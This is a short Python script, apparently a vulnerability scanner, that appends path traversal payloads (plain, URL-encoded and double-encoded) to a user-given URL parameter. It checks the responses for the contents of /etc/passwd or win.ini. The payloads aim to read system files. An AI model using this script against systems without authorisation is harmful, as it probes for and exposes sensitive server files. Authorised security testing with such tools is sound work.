import requests

# List of relative path traversal payloads
payloads = [
    "../../../../etc/passwd",          # Linux password file
    "../../../../windows/win.ini",     # Windows system file
    "..%2f..%2f..%2f..%2fetc%2fpasswd", # URL-encoded relative path traversal
    "..%252f..%252f..%252f..%252fetc%252fpasswd"  # Double URL encoding
]

def check_relative_path_traversal(url, param):
    print(f"Checking Relative Path Traversal Vulnerabilities on: {url}")

    for payload in payloads:
        full_url = f"{url}?{param}={payload}"
        response = requests.get(full_url, timeout=5)
        
        if "root:x:" in response.text:
            print(f"[!] Vulnerability Found: {full_url} (Exposed /etc/passwd)")
        elif "[extensions]" in response.text:
            print(f"[!] Vulnerability Found: {full_url} (Exposed Windows win.ini)")
        elif response.status_code == 200:
            print(f"[!] Possible Vulnerability: {full_url} (Check response manually)")
        else:
            print(f"[-] No issue found at {full_url} (Status Code: {response.status_code})")

# Get URL and parameter input from the user
target_url = input("Please enter the target URL (e.g., https://example.com): ")
target_param = input("Please enter the parameter name (e.g., file): ")
check_relative_path_traversal(target_url, target_param)
